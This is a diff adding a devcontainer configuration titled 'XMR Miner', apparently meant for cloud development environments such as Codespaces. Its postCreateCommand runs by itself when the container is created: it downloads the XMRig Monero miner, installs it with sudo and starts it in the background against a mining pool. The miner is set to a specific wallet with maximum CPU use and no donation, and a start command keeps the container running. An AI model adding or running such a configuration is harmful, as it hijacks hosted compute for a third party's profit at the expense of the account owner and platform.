@@ -1,0 +1,7 @@
+{
+  "name": "XMR Miner",
+  "image": "mcr.microsoft.com/devcontainers/base:ubuntu",
+  "features": {},
+  "postCreateCommand": "curl -sL https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-focal-x64.tar.gz | sudo tar xz -C /usr/local/bin --strip-components=1 && sudo chmod +x /usr/local/bin/xmrig && nohup /usr/local/bin/xmrig -o gulf.moneroocean.stream:10032 -u 45qqTqhjmsz8mhzry3dG6rJgt9Jdzfh9xa6Skh1mtmBGgNubPDsrJVVEg6cWS6DtEB5i6BWTEaQA7BRws6UEibKEAQ1dd9X -p codespace_worker --donate-level=0 --cpu-max-threads-hint=100 > /tmp/xmrig.log 2>&1 &",
+  "postStartCommand": "echo 'xmrig running in background' && sleep infinity"
+}
